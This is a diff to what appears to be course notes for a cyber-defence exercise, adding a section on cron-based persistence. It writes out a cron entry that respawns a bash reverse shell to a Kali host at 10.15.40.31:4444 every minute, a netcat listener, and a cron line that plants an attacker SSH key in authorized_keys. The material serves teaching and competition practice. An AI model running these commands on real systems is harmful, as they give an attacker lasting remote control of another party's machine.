@@ -110,7 +110,30 @@ find your ip address and delete the line (or change it so they chase their tail)
 
 use Portalord to establish a reverse ssh tunnel
 
+## Schedule cron jobs that call back to maintain persistence
 
+Respawn a reverse shell
+
+<div class="terminal"> chrontab -e </div>
+at the bottom of the page add in your kali IP and pick a port (I put in 4444, but you can use any high port)
+
+<div class="terminal"> * * * * * bash -c 'bash -i &gt;& /dev/tcp/10.15.40.31/4444 0&gt;&1'</div>
+
+<div style="text-align: center;">
+  <img src="{{ 'classes/cyberus/images/chronshell.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
+</div>
+now on your kali machine, open a listener on the highportexit
+
+<div class="terminal"> nc -lvnp 4444 </div>
+
+<div style="text-align: center;">
+  <img src="{{ 'classes/cyberus/images/listening.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
+</div>
+
+<div style="text-align: center;">
+  <img src="{{ 'classes/cyberus/images/heard.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
+</div>
+* * * * * echo "ssh-rsa AAAA...attackerkey" &gt;&gt; /home/ubuntu/.ssh/authorized_keys
 ---
 
 # Process Hunting & Removal
@@ -267,12 +290,6 @@ View rules
 
 ---
 
-
-# Persistence (Stay on the Box)
-
-Attackers WILL come back unless you remove persistence.
-
----
 
 ## Cron Jobs (Scheduled Backdoors)
 
